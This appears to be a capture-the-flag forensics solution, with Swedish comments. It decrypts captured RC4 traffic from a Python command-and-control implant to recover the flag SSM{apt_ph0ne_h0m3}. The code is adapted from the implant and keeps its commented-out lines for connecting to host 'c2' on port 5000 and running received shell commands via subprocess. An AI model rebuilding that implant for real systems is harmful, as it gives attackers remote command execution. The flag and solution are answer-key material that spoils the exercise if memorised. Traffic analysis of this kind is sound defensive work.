# Använde Wireshark och hittade HTTP
# Såg att en pythonfil laddades ner
# Den kopplar på port 5000, följer den tcp-stream som kör port 5000
# Första meddalandet är nyckeln och resten meddelanden
# Använder pythonfilen men med lite små ändringar för att sedan avkoda datan

#!/usr/bin/env python3

import socket
import struct
import subprocess
import time
import zlib

HOST, PORT = "c2", 5000

key = "b26d2e748be37518ba342605853ee094"
messages = ["e6c2",
"835b9929093a4c012a7e6cf345c1f6a4cc457c60c3812395bd75c64e0f13",
"4f495b9ecc9486",
"7472164ea3c2d1b7ad6df59e39263ef3be9c6483e5077e8a85ac38c4b1ad9f2f1c344b9027da300db8cb83b172e6296bbbf385fed4d0b08922cbf1c8e3ff506ad0968ee4328b93d11bfc97a48c46d9431c9da61ae8875913c4834ffe6353fb383e188680c687e89736e938514ea331de1b7ba83021161b44f8d3b1c78af4281ce1fd8e2d81801ca927db23580af7c01140fb45427aa2e83de2f0a81e5e188c423fd0afe5dc914457eec30e6179dd5915c92804f40c95a9e2dcd1ec6c04c181c764775fe5c1ded12d681cc512c31e4eb80d54232408928b0e289eccf4bcac3b249f645725dc863e3a4a0d34f57a0bf4d9558314960463b4117b912c34050b1a5f635b3dd2ada80b8033cdd703bf9122cfb0620e473524209463911912046455e75513f3d534efcb2c97b98b489dc449d3a087c1576848861866695b1585b6d37df716cedd1e213d78de2adfe71772dbbbf4d75b43ac0563c6be968c8b5dd57bb01832a325bc996d4b92ea5730a49331d69ef26b17d071527693b8be8d99c009e810c95f1787baae6d0f6e1bbce283eb8de70eed9c0befa73f46314ce65e67b970fa10d0812239938e03eab834f2bf1d8fb539ea568deb62d57058b0f3cd68c3c7ded58f4c10d529c0e2ee521effbe146fe5365254e11f9c28c1c00d33e50b1a91491654fb7b62bfadcb15985e53e1355ff8171f245ffa02343f0e1bc6338a934cc448e3",
"748e5cd08ad9fdd98af98cd8e5e31b",
"fbadc0f901e7f8dacd4fe7bd53d19e7f6428c2a72fef73f7690cfe97554662f2d7f94d4a5c233ec43b303956e25f0bd383432050d3eb25780f19843a485e8155107761ce152ca6da812f9fd120a6a638a11486f0a723318b80af2fbef617bef50287012f8abaa6e4e58fd0cc1da3d15acef809017cd9531dd9fa5efb2360a5b81b0aea71d278be4195a8761ce18fa686d693f331b9c3fce50cbcf9db8d44ee950c2ee0ceedbf5d758bae8d52041434e93ceb229436d382c677178a0cf6a86f624901901d8e0a3c8472679c9570cf998424d86bf2ce742b6035e36f8e37cad4ddeddb06897e5dc87df07932d252bc082a05e4733851ec9db7aba901e2fdf505ec17bca14c77dc5492c13180bbee5d97443bef78fda89bd9a9f55ff22d74e64eb70741c3a249a3ec74b85045ebfffd1ebd5150a12fde06acd15517517a7eaf361986b6d03bb968d4f82eeda2227e4593e4524c52b15a073f51ebc3753bab58530e20d478ea031adb6eebb1e7e0565024e46bdbc87cee35193561d229bb6ba8c8c052b2e463",
"a518",
"77c71c8a9e368db09f1f7f1dd4a2c0b07ac4660a33ebb5e0f1041f0d0e5f59059891b1b4610aade337defdc963a0702160b8d805b28c6c70adf0e10fe1b41c303faa617217261eddb347b7411803cb1bfa76a30ed46eab20168c39c8aff501804d3053d00147853be3c0ab1e0139a7dfb44e260d9e24bc65e0de6818024b4df77121c194ca1e3a05c70dc180cad2a291a90b66182e089343a683241eeed303",
"e2b32cfb5499bc190c2db86f",
"e412d6a585971c3c070dca289fc107985e2084c34cae2e761414c1"]


def rc4_init(key):
    rc4_state = [i for i in range(256)]
    i = 0
    for j in range(256):
        i = (i + rc4_state[j] + key[j % len(key)]) & 0xFF
        rc4_state[j], rc4_state[i] = rc4_state[i], rc4_state[j]

    return rc4_state

def rc4_stream(rc4_state):
    i = 0
    j = 0
    while True:
        i = (1 + i) % 256
        j = (rc4_state[i] + j) % 256
        tmp = rc4_state[j]
        rc4_state[j] = rc4_state[i]
        rc4_state[i] = tmp
        yield rc4_state[(rc4_state[i] + rc4_state[j]) % 256]  

#with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    #sock.connect((HOST, PORT))

session_key = bytes(0x42 ^ x for x in bytes.fromhex(key))

rc4s = rc4_init(struct.pack('<Q', int(1714256933.105364000)//10) + session_key)
rc4 = rc4_stream(rc4s)

i = 0
while True:
    cmd_enc = bytes.fromhex(messages[i])
    i += 1
    if len(cmd_enc) == 0:
        break
    cmd_dec = bytes(x^y for x,y in zip(rc4, cmd_enc))
    print(f'Running command: {cmd_dec.decode()}')
    #res_dec = subprocess.check_output(cmd_dec, shell=True)
    
    #res_comp = zlib.compress(res_dec)
    res_enc = bytes(x^y for x,y in zip(rc4, bytes.fromhex(messages[i])))
    i += 1
    res_enc = zlib.decompress(res_enc)
    print(f'Sending result:\n: {res_enc.decode()}')

    """ ...Running command: cat flag.txt
Sending result:
: SSM{apt_ph0ne_h0m3}"""
